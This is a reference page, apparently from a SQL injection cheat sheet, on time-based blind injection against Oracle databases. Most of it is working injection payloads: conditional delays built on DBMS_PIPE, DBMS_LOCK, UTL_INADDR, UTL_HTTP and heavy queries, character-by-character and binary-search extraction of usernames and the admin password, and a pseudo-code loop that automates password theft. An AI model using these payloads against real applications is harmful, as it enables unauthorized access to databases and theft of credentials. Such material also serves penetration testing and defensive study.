---
title: Timing
description: Using time-based techniques for Oracle SQL injection attacks
category: Injection Techniques
order: 11
tags: ["timing", "blind injection", "delay", "time-based"]
lastUpdated: 2025-03-15
---

## Timing

Time-based techniques are essential for extracting information in blind SQL injection scenarios where no direct output is visible. By introducing deliberate delays based on conditions, attackers can infer data by measuring the response time of the application.

### Oracle Delay Functions

Oracle provides several methods to introduce delays:

| Method                        | Description                            | Example                                                          | Privileges Required   |
| ----------------------------- | -------------------------------------- | ---------------------------------------------------------------- | --------------------- |
| `DBMS_PIPE.RECEIVE_MESSAGE`   | Waits for a message in a pipe          | `DBMS_PIPE.RECEIVE_MESSAGE('nonexistent', 10)`                   | EXECUTE on DBMS_PIPE  |
| `DBMS_LOCK.SLEEP`             | Suspends session for specified seconds | `DBMS_LOCK.SLEEP(10)`                                            | EXECUTE on DBMS_LOCK  |
| `UTL_INADDR.GET_HOST_ADDRESS` | DNS resolution delay                   | `UTL_INADDR.GET_HOST_ADDRESS('nonexistent-domain.com')`          | EXECUTE on UTL_INADDR |
| `UTL_HTTP.REQUEST`            | HTTP request delay                     | `UTL_HTTP.REQUEST('http://slow-website.com')`                    | EXECUTE on UTL_HTTP   |
| Heavy queries                 | CPU/IO intensive operations            | `SELECT COUNT(*) FROM all_objects a,all_objects b,all_objects c` | Basic SELECT          |

### Basic Time-Based Injection

```sql
-- Basic time delay (10 seconds)
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',10)=0--

-- Conditional time delay
' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE NULL END) IS NULL--
```

### Using DBMS_PIPE.RECEIVE_MESSAGE

This is the most commonly used delay function in Oracle:

```sql
-- Basic usage
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',10)=0--

-- Wait for 5 seconds
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=0--

-- Character extraction with time delay
' AND (CASE WHEN SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a' THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE NULL END) IS NULL--
```

### Using DBMS_LOCK.SLEEP

If you have privileges:

```sql
-- Basic usage
' AND DBMS_LOCK.SLEEP(10)=0--

-- Extracting data bit by bit
' AND (CASE WHEN (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) & 1)=1 THEN DBMS_LOCK.SLEEP(10) ELSE NULL END) IS NULL--
```

### Heavy Queries for Delay

When no delay functions are available:

```sql
-- Join multiple large tables for CPU-intensive operation
' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE a.object_id=b.object_id) ELSE 0 END)>=0--

-- Hierarchical queries
' AND (CASE WHEN SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a' THEN (SELECT COUNT(*) FROM all_objects START WITH object_id=1 CONNECT BY PRIOR object_id=object_id) ELSE 0 END)>=0--
```

### SQL Injection Examples

#### Character-by-Character Extraction

```sql
-- Extract first character of username
' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--

-- Extract second character of username
' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),2,1))=98 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--
```

#### Binary Search Algorithm

More efficient extraction using binary search:

```sql
-- Test if ASCII value >= 128
' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))>=128 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--

-- Test if ASCII value >= 64 (assuming previous test was false)
' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))>=64 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--

-- Continue narrowing down the range
```

#### Testing for Existence

```sql
-- Check if table exists
' AND (CASE WHEN (SELECT COUNT(*) FROM all_tables WHERE table_name='USERS')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--

-- Check if specific user exists
' AND (CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--
```

### Alternative Delay Techniques

#### Using UTL_INADDR

If DBMS_PIPE is not available:

```sql
-- Causing delay with DNS resolution
' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN UTL_INADDR.GET_HOST_ADDRESS('nonexistent-subdomain.'||(SELECT DBMS_RANDOM.STRING('L',20) FROM DUAL)||'.example.com') ELSE '127.0.0.1' END) IS NOT NULL--
```

#### Using UTL_HTTP

```sql
-- HTTP request delay
' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN UTL_HTTP.REQUEST('http://slow-website.com') ELSE UTL_HTTP.REQUEST('http://fast-website.com') END) IS NOT NULL--
```

#### Using XML Processing

```sql
-- XML parsing delay
' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN SYS.XMLTYPE.CREATEXML('<xml>'||(SELECT RPAD('a',4000,'a') FROM DUAL)||'</xml>') ELSE NULL END) IS NOT NULL--
```

### Managing Timeout Risks

Application or database timeouts can interrupt time-based extraction:

```sql
-- Using shorter delays (1-2 seconds)
' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',2) ELSE NULL END) IS NULL--

-- Gradual increasing delays
' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',1) ELSE NULL END) IS NULL--
```

### Combining with Other Techniques

```sql
-- Combining time-based with error-based
' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE TO_CHAR(1/0) END) IS NULL--

-- Combining time-based with UNION
' UNION SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a') > 0 THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 'b' END, NULL FROM DUAL--
```

### Practical Considerations

#### Measuring Response Time

For effective time-based extraction:

1. Establish a baseline for normal response time
2. Use delays significantly larger than normal variance (at least 3-5 seconds)
3. Make multiple requests to confirm results
4. Consider network latency and server load variations

#### Automating Extraction

Use automation tools for efficient extraction:

```sql
-- Example of script logic (pseudo-code)
for position in 1..20:
    for char_value in 32..127:
        inject "' AND (CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE username='admin'),$position,1))=$char_value THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--"
        if response_time > 5 seconds:
            extracted_char = char(char_value)
            break
```
